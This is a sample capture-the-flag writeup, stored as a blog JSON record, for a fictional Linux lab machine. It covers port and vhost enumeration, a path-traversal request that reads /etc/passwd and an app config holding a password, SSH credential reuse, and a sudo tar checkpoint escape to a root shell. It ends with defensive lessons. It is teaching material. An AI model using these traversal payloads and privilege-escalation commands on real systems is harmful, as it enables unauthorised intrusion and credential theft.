{"slug":"htb-sample-lantern","title":"Sample HTB Writeup: Lantern (Fictional Linux Box)","date":"2026-10-12","updated":null,"description":"A template walkthrough for a fictional Easy Linux machine: virtual host discovery, a path traversal that leaks credentials, and a sudo misconfiguration.","category":"writeup","platform":"HTB","difficulty":"Easy","tags":["linux","web","path-traversal","privilege-escalation","sample","htb"],"featured":true,"cover":null,"readingTime":2,"html":"<aside class=\"callout callout-note\" role=\"note\"><p class=\"callout-title\">Note</p>\n<p><strong>Sample content.</strong> \"Lantern\" is a fictional machine used to demonstrate the writeup layout. Replace this post with your own retired-machine writeups.</p>\n</aside>\n<h2 id=\"summary\">Summary<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#summary\">#</a></h2>\n<figure><img src=\"/images/htb-sample-lantern/attack-path.svg\" alt=\"Attack path overview\" loading=\"lazy\" decoding=\"async\"><figcaption>Attack path: enumeration, file read, credential reuse, sudo abuse.</figcaption></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<div class=\"table-wrap\"><table><thead><tr><th>Step</th><th>Technique</th></tr></thead><tbody><tr><td>Foothold</td><td>Path traversal in a download API</td></tr><tr><td>User</td><td>Credential reuse over SSH</td></tr><tr><td>Root</td><td><code>sudo tar</code> with checkpoint action</td></tr></tbody></table></div>\n<h2 id=\"enumeration\">Enumeration<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#enumeration\">#</a></h2>\n<h3 id=\"port-scan\">Port scan<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#port-scan\">#</a></h3>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">console</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"console\"><code><span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ nmap -p- --min-rate 2000 -oN scans/all 10.10.11.50</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">PORT   STATE SERVICE</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">22/tcp open  ssh</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">80/tcp open  http</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ nmap -sC -sV -p22,80 -oN scans/detail 10.10.11.50</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">80/tcp open  http    nginx 1.18.0</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">|_http-title: Did not follow redirect to http://lantern.htb/</span></span></code></pre></div>\n<p>The redirect reveals a hostname, so it goes into <code>/etc/hosts</code>:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">bash</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"bash\"><code><span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">echo</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> \"10.10.11.50 lantern.htb\"</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> |</span><span style=\"--shiki-light:#6F42C1;--shiki-dark:#F69D50\"> sudo</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> tee</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> -a</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> /etc/hosts</span></span></code></pre></div>\n<h3 id=\"virtual-hosts\">Virtual hosts<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#virtual-hosts\">#</a></h3>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">console</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"console\"><code><span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ ffuf -u http://lantern.htb -H </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"Host: FUZZ.lantern.htb\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> \\</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">files                   [Status: 200, Size: 2311]</span></span></code></pre></div>\n<h2 id=\"foothold\">Foothold<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#foothold\">#</a></h2>\n<p>The <code>files</code> vhost exposes a download endpoint that takes a filename parameter. A quick test with a relative path shows it is not normalised:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">http</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"http\"><code><span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">GET</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> /download?name=../../../../etc/passwd </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">HTTP</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">/</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">1.1</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#22863A;--shiki-dark:#8DDB8C\">Host</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">:</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> files.lantern.htb</span></span></code></pre></div>\n<p>The response contains <code>/etc/passwd</code>, which lists a <code>svc</code> user. Reading the application's config file leaks a database password:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">console</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"console\"><code><span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ curl -s </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"http://files.lantern.htb/download?name=../app/config.yaml\"</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">database:</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">  user: lantern</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">  password: &#x3C;redacted></span></span></code></pre></div>\n<aside class=\"callout callout-tip\" role=\"note\"><p class=\"callout-title\">Tip</p>\n<p>When a file read works, check application configs, <code>.env</code> files and service units before going further.</p>\n</aside>\n<h2 id=\"user\">User<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#user\">#</a></h2>\n<p>The database password is reused by <code>svc</code> over SSH.</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">console</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"console\"><code><span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ ssh svc@lantern.htb</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#6F42C1;--shiki-dark:#6CB6FF\">svc@lantern:~</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ id</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">uid=1001(svc) gid=1001(svc) groups=1001(svc)</span></span></code></pre></div>\n<h2 id=\"privilege-escalation\">Privilege escalation<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#privilege-escalation\">#</a></h2>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">console</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"console\"><code><span class=\"line\"><span style=\"--shiki-light:#6F42C1;--shiki-dark:#6CB6FF\">svc@lantern:~</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">$ sudo -l</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">User svc may run the following commands on lantern:</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">    (root) NOPASSWD: /usr/bin/tar</span></span></code></pre></div>\n<p><code>tar</code> can execute a command at a checkpoint, a well-known <a href=\"https://gtfobins.github.io/gtfobins/tar/\">GTFOBins</a> entry:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">bash</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"bash\"><code><span class=\"line\"><span style=\"--shiki-light:#6F42C1;--shiki-dark:#F69D50\">sudo</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> tar</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> -cf</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> /dev/null</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> /dev/null</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> --checkpoint=1</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> --checkpoint-action=exec=/bin/bash</span></span></code></pre></div>\n<h2 id=\"lessons\">Lessons<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#lessons\">#</a></h2>\n<ul>\n<li>Normalise and confine file paths server-side; never trust a filename parameter.</li>\n<li>Unique credentials per service would have stopped the pivot to SSH.</li>\n<li>Audit <code>sudo</code> rules for binaries with known escape behaviour.</li>\n</ul>","toc":[{"depth":2,"id":"summary","text":"Summary"},{"depth":2,"id":"enumeration","text":"Enumeration"},{"depth":3,"id":"port-scan","text":"Port scan"},{"depth":3,"id":"virtual-hosts","text":"Virtual hosts"},{"depth":2,"id":"foothold","text":"Foothold"},{"depth":2,"id":"user","text":"User"},{"depth":2,"id":"privilege-escalation","text":"Privilege escalation"},{"depth":2,"id":"lessons","text":"Lessons"}],"prev":{"slug":"nmap-scanning-workflow","title":"A Practical Nmap Workflow for Lab Machines"},"next":{"slug":"jwt-algorithm-confusion","title":"JWT Algorithm Confusion: How It Happens and How to Prevent It"},"related":["thm-sample-sql-injection-room","linux-privilege-escalation-checklist","jwt-algorithm-confusion"]}